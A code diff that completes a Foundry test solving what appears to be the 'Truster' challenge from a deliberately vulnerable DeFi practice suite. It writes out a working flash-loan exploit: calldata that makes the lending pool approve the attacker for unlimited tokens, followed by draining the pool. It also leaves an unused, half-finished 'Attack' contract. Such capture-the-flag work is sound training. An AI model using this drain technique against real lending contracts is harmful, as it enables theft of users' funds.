@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "../../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
@@ -13,7 +14,7 @@ contract Truster is Test {
     Utilities internal utils;
     TrusterLenderPool internal trusterLenderPool;
     DamnValuableToken internal dvt;
-    address payable internal attacker;
+    address payable public attacker;
 
     function setUp() public {
         /**
@@ -41,7 +42,12 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max);
+        uint256 balance = dvt.balanceOf(address(trusterLenderPool));
+        trusterLenderPool.flashLoan(0, address(this), address(dvt), data);
 
+        dvt.transferFrom(address(trusterLenderPool),attacker, balance);
         /**
          * EXPLOIT END *
          */
@@ -54,4 +60,15 @@ contract Truster is Test {
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
     }
+}
+
+
+abstract contract Attack is ERC20{
+    Truster truster;
+    function functionCall (bytes calldata data) public {
+
+    approve(truster.attacker(), type(uint256).max);
+    }
+
+
 }
